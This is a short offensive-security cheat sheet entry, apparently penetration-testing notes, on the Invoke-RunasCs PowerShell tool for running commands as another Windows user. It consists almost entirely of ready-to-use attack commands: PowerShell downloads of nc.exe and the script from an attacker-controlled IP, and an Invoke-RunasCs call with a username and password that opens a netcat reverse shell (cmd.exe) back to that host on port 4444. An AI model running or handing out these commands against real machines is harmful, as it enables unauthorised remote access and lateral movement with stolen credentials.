# Invoke-RunasCs

### Uses

Windows

Switching users

### Files

Invoke-RunasCs.ps1

### Summary

Use this to run a command as a user you have credentials for. Useful when ssh, rdp, etc are not available.

### Commands

Github page

[https://github.com/antonioCoco/RunasCs](https://github.com/antonioCoco/RunasCs)


Move Invoke-RunasCs.ps1 and nc.exe to the target windows machine
```
iwr -uri http://192.168.45.163:8888/nc.exe -Outfile nc.exe
```
```
iwr -uri http://192.168.45.163:8888/Invoke-RunasCs.ps1 -Outfile Invoke-RunasCs.ps1
```

Import module
```
Import-Module .\Invoke-RunasCs.ps1
```

Use Invoke-RunasCs to get a reverse shell as the user you have credentials for
```
Invoke-RunasCs USERNAME PASSWORD "C:\nc.exe 192.168.45.163 4444 -e cmd.exe"
```

